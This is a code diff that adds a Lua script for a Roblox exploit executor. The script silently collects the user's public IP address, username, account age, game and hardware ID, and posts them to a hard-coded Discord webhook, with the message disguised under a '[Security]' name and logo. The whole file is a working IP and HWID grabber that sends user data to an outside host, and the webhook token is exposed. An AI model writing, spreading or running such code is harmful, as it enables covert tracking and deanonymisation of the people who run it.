@@ -1,0 +1,55 @@
+local ip = game:HttpGet("https://api.ipify.org")
+local Executor = identifyexecutor()
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local AccountAge = LocalPlayer.AccountAge
+local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local DiscordID = "1082732263042732173"
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+syn.request({
+  Url = "https://discord.com/api/webhooks/1084573200807108739/sN1V2uqGfcF5ZIwJNXXyNd1Y7-ozFTXP89UJNNZWew3-PKp081P2SiUQE64IGCpcNaA8",
+  Body = game:GetService("HttpService"):JSONEncode({
+    ["embeds"]={{
+      ["title"]="**IPv4:** [ ||```"..ip.."```|| ]",
+      ["type"]="rich",
+      ["color"]=tonumber(0x1099f9),
+
+      ["fields"]= {
+        {
+          ["name"]= "**Username:**",
+          ["value"]= "```"..game.Players.LocalPlayer.Name.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**Account Age:**",
+          ["value"]= "```"..AccountAge.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**Executor:**",
+          ["value"]= "```"..Executor.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**Game Name:**",
+          ["value"]= "```"..GameName.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**Discord ID:**",
+          ["value"]= "||<@"..DiscordID..">||",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**HWID:**",
+          ["value"]= "||"..HWID..">||",
+          ["inline"]= true
+        },
+      },
+    }},
+    ["avatar_url"]="https://www.pngall.com/wp-content/uploads/4/Cyber-Security-Logo-PNG.png",
+    ["username"]="[Security]",
+  }),
+  Method = "POST",
+  Headers = {["content-type"] = "application/json"}
+})
